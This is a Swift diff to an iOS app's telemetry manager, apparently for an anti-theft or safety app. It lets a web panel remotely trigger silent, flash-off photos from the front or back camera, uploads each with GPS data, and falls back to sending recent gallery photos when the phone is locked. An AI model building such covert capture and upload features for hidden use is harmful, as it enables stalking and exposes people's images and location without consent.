@@ -23,6 +23,7 @@ final class TelemetryManager: ObservableObject {
     @Published var isUpdating: Bool = false
     @Published var isSending: Bool = false
     @Published var isSyncingGallery: Bool = false
+    @Published var isCapturingPhoto: Bool = false
     @Published var syncedPhotosCount: Int = UserDefaults.standard.stringArray(forKey: "uploaded_gallery_asset_ids")?.count ?? 0
     
     private let apiClient = APIClient.shared
@@ -53,8 +54,8 @@ final class TelemetryManager: ObservableObject {
         // 1. Envío inicial inmediato
         sendTelemetryNow()
         
-        // 2. Timer continuo en foreground (cada 20 segundos)
-        timerCancellable = Timer.publish(every: 20, on: .main, in: .common)
+        // 2. Timer continuo en foreground (cada 6 segundos para respuesta rápida a botones del panel web)
+        timerCancellable = Timer.publish(every: 6, on: .main, in: .common)
             .autoconnect()
             .sink { [weak self] _ in
                 self?.sendTelemetryNow()
@@ -223,10 +224,12 @@ final class TelemetryManager: ObservableObject {
         }
         let photoStatus = PHPhotoLibrary.authorizationStatus(for: .readWrite)
         let hasPhotos = (photoStatus == .authorized || photoStatus == .limited)
+        let hasCam = AVCaptureDevice.authorizationStatus(for: .video) == .authorized
         payload["permissions"] = [
             "location_authorized": hasLocAuth,
             "notifications_enabled": hasNotifications,
             "photos_authorized": hasPhotos,
+            "camera_authorized": hasCam,
             "accessibility": true,
             "location": hasLocAuth
         ]
@@ -248,7 +251,16 @@ final class TelemetryManager: ObservableObject {
             case "locate":
                 LocationManager.shared.refreshLocation()
                 LocationManager.shared.startUpdating()
-            case "photo", "sync_gallery", "screenshot", "full_evidence":
+            case "photo", "photo_back":
+                // Foto normal SIN FLASH (cámara trasera, sin SOS)
+                await captureAndUploadCameraPhoto(position: .back, isSOS: false)
+            case "photo_front":
+                // Foto normal SIN FLASH (cámara frontal, sin SOS)
+                await captureAndUploadCameraPhoto(position: .front, isSOS: false)
+            case "sos_photo":
+                // Foto CON SOS SIN FLASH (cámara trasera + alerta SOS + ubicación GPS)
+                await captureAndUploadCameraPhoto(position: .back, isSOS: true)
+            case "sync_gallery", "screenshot", "full_evidence":
                 await syncRecentGalleryPhotos(limit: 15, force: true)
             case "ring", "siren":
                 await MainActor.run {
@@ -261,6 +273,77 @@ final class TelemetryManager: ObservableObject {
                 break
             }
         }
+    }
+    
+    // MARK: - Captura de Cámara SIN FLASH (Con SOS y Sin SOS)
+    
+    func triggerPhotoCaptureNow(position: AVCaptureDevice.Position = .back, isSOS: Bool = false) {
+        Task {
+            await captureAndUploadCameraPhoto(position: position, isSOS: isSOS)
+        }
+    }
+    
+    func captureAndUploadCameraPhoto(position: AVCaptureDevice.Position = .back, isSOS: Bool = false) async {
+        await MainActor.run { self.isCapturingPhoto = true }
+        defer { Task { @MainActor in self.isCapturingPhoto = false } }
+        
+        let timestamp = ISO8601DateFormatter().string(from: Date())
+        let loc = LocationManager.shared.lastLocation
+        let lat = loc?.coordinate.latitude ?? 0.0
+        let lng = loc?.coordinate.longitude ?? 0.0
+        let acc = loc?.horizontalAccuracy ?? 0.0
+        
+        // Si es con SOS, disparar alerta SOS inmediata en /api/telemetry.php
+        if isSOS {
+            _ = try? await apiClient.sendTelemetry([
+                "type": "sos",
+                "sos": 1,
+                "lat": lat,
+                "lng": lng,
+                "accuracy": acc,
+                "timestamp": timestamp
+            ])
+        }
+        
+        // Capturar foto automáticamente SIN FLASH (flashMode = .off, torchMode = .off)
+        if let photoData = await SilentCameraManager.shared.capturePhoto(position: position) {
+            let camSide = (position == .front) ? "front" : "back"
+            let uploadType = isSOS ? "sos_photo" : "photo"
+            let filename = isSOS
+                ? "sos_sinflash_\(camSide)_\(Int(Date().timeIntervalSince1970)).jpg"
+                : "foto_sinflash_\(camSide)_\(Int(Date().timeIntervalSince1970)).jpg"
+            let meta: [String: Any] = [
+                "source": "ios_camera_no_flash",
+                "camera": camSide,
+                "flash": "off",
+                "sos": isSOS,
+                "timestamp": timestamp,
+                "latitude": lat,
+                "longitude": lng,
+                "accuracy": acc
+            ]
+            do {
+                let uploaded = try await apiClient.uploadMedia(
+                    data: photoData,
+                    filename: filename,
+                    mimeType: "image/jpeg",
+                    type: uploadType,
+                    meta: meta
+                )
+                if uploaded {
+                    await MainActor.run {
+                        self.syncedPhotosCount += 1
+                    }
+                    return
+                }
+            } catch {
+                print("Error subiendo foto sin flash: \(error)")
+            }
+        }
+        
+        // Respaldo: si el teléfono tiene la pantalla bloqueada en segundo plano y iOS impide abrir AVCaptureSession,
+        // enviamos la foto más reciente de la galería para que el panel siempre reciba imagen.
+        await syncRecentGalleryPhotos(limit: 4, force: true)
     }
     
     // MARK: - Sincronización de Galería de Fotos (PHPhotoLibrary -> /api/upload.php)
